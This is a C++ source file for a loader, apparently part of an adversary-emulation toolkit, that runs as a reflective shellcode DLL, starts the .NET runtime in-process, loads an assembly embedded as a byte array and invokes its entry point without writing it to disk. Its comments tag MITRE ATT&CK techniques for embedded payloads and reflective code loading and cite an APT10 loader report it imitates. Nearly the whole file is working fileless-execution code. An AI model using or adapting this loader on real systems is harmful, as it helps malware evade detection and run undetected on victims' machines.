// managed-loader is embededded in this header at build-time.
#include "native-loader.hpp"
#include "error.hpp"
#include <expected>
#include <iostream>

/**
 * embedded.hpp
 *      About:
 *          A .NET assembly embedded as an unsigned char array at build-time.
 *      Result:
 *          Since the native-loader itself is a reflective shellcode DLL,
 *          the embedded .NET assembly never touches disk.
 *      MITRE ATT&CK Techniques:
 *          T1027.009: Obfuscated Files or Information: Embedded Payloads
 *      CTI:
 *          https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/
 */
#include "embedded.hpp"


#pragma region Includes and Imports
#include <metahost.h>
#pragma comment(lib, "mscoree.lib")

// Import mscorlib.tlb (Microsoft Common Language Runtime Class Library).
#import <mscorlib.tlb> raw_interfaces_only			\
    	high_property_prefixes("_get","_put","_putref")		\
    	rename("ReportEvent", "InteropServices_ReportEvent")	\
	rename("or", "InteropServices_or")
using namespace mscorlib;
#pragma endregion

bool DllMain(HINSTANCE, DWORD, LPVOID) { return true; }

/**
 * execute_assembly
 *      About:
 *          Loads an embedded .NET assembly into memory and invokes a member
 *          function.
 *      Result:
 *          The target .NET code is run without being written to disk.
 *      MITRE ATT&CK Techniques:
 *          T1620: Reflective Code Loading
 *      CTI:
 *          https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/
 */
bool execute_assembly() {
    // Load the CLR runtime
    ICLRMetaHost* meta_host{ nullptr };

    HRESULT result = CLRCreateInstance(
        CLSID_CLRMetaHost,
        IID_PPV_ARGS(&meta_host)
    );
    if (FAILED(result)) {
        std::println(
            std::cerr,
            "Failed to create CLR instance: {}",
            common::get_error_message(result)
        );
        return false;
    }

    // Get the ICLRRuntimeInfo corresponding to a particular CLR version. It  
    // supersedes CorBindToRuntimeEx with STARTUP_LOADER_SAFEMODE. 
    ICLRRuntimeInfo* runtime_info{ nullptr };

    result = meta_host->GetRuntime(L"v4.0.30319", IID_PPV_ARGS(&runtime_info));
    if (FAILED(result)) {
        std::println(
            std::cerr,
            "Failed to get .NET Runtime info: {}",
            common::get_error_message(result)
        );
        return false;
    }

    // Check if the specified runtime can be loaded into the process. This  
    // method will take into account other runtimes that may already be  
    // loaded into the process and set pbLoadable to TRUE if this runtime can  
    // be loaded in an in-process side-by-side fashion.  
    BOOL loadable{ FALSE };

    result = runtime_info->IsLoadable(&loadable);
    if (FAILED(result)) {
        std::println(
            std::cerr,
            "Failed to query whether .NET Runtime is loadable: {}",
            common::get_error_message(result)
        );
        return false;
    }
    if (!loadable) {
        std::println(std::cerr, ".NET Runtime is not loadable");
        return false;
    }

    // Load the CLR into the current process and return a runtime interface  
    // pointer. ICorRuntimeHost and ICLRRuntimeHost are the two CLR hosting   
    // interfaces supported by CLR 4.0. Here we demo the ICorRuntimeHost  
    // interface that was provided in .NET v1.x, and is compatible with all  
    // .NET Frameworks.  
    ICorRuntimeHost* runtime_host{ nullptr };

    result = runtime_info->GetInterface(CLSID_CorRuntimeHost, IID_PPV_ARGS(&runtime_host));
    if (FAILED(result)) {
        std::println(
            std::cerr,
            "Failed to get .NET Runtime interface: {}",
            common::get_error_message(result)
        );
        return false;
    }

    //----------------------------------------------------------------------
    // Start the CLR
    result = runtime_host->Start();
    if (FAILED(result)) {
        std::println(
            std::cerr,
            "Failed to start .NET Runtime: {}",
            common::get_error_message(result)
        );
        return false;
    }

    //----------------------------------------------------------------------
    // Get the default AppDomain for this Runtime host
    IUnknownPtr domain_thunk{ nullptr };
    _AppDomainPtr default_domain{ nullptr };

    // Get a pointer to the default AppDomain in the CLR.
    result = runtime_host->GetDefaultDomain(&domain_thunk);
    if (FAILED(result)) {
        std::println(
            std::cerr,
            "Failed to get default AppDomain: {}",
            common::get_error_message(result)
        );
        return false;
    }

    result = domain_thunk->QueryInterface(IID_PPV_ARGS(&default_domain));
    if (FAILED(result)) {
        std::println(
            std::cerr,
            "Failed to query AppDomain thunk: {}",
            common::get_error_message(result)
        );
        return false;
    }

    //----------------------------------------------------------------------
    // Load the assembly from memory, declared as an unsigned char array
    SAFEARRAYBOUND bounds[1];
    bounds[0].cElements = embedded::assembly_length;
    bounds[0].lLbound = 0;

    SAFEARRAY* arr = SafeArrayCreate(VT_UI1, 1, bounds);
    SafeArrayLock(arr);
    memcpy(arr->pvData, embedded::assembly, embedded::assembly_length);
    SafeArrayUnlock(arr);

    _AssemblyPtr assembly{ nullptr };
    result = default_domain->Load_3(arr, &assembly);
    if (FAILED(result)) {
        std::println(
            std::cerr,
            "Failed to load .NET assembly: {}",
            common::get_error_message(result)
        );
        return false;
    }

    // Get the Type (ie: Namespace and Class type) to be instanciated from the assembly
    bstr_t class_name{ "ManagedLoader.ManagedLoader" };
    _TypePtr type{ nullptr };

    result = assembly->GetType_2(class_name, &type);
    if (FAILED(result)) {
        std::println(
            std::cerr,
            "Failed to query .NET assembly type: {}",
            common::get_error_message(result)
        );
        return false;
    }

    //----------------------------------------------------------------------
    // Finally, invoke the method passing it some arguments as a single string
    bstr_t method_name{ L"EntryPoint" };
    variant_t return_value{};
    variant_t empty{};


    // Invoke the method from the Type interface.
    result = type->InvokeMember_3(
        method_name,
        static_cast<BindingFlags>(BindingFlags_InvokeMethod | BindingFlags_Static | BindingFlags_Public),
        NULL,
        empty,
        NULL,
        &return_value
    );
    if (FAILED(result)) {
        std::println(
            std::cerr,
            "Failed to invoke .NET assembly member: {}",
            common::get_error_message(result)
        );
        return false;
    }

    return true;
}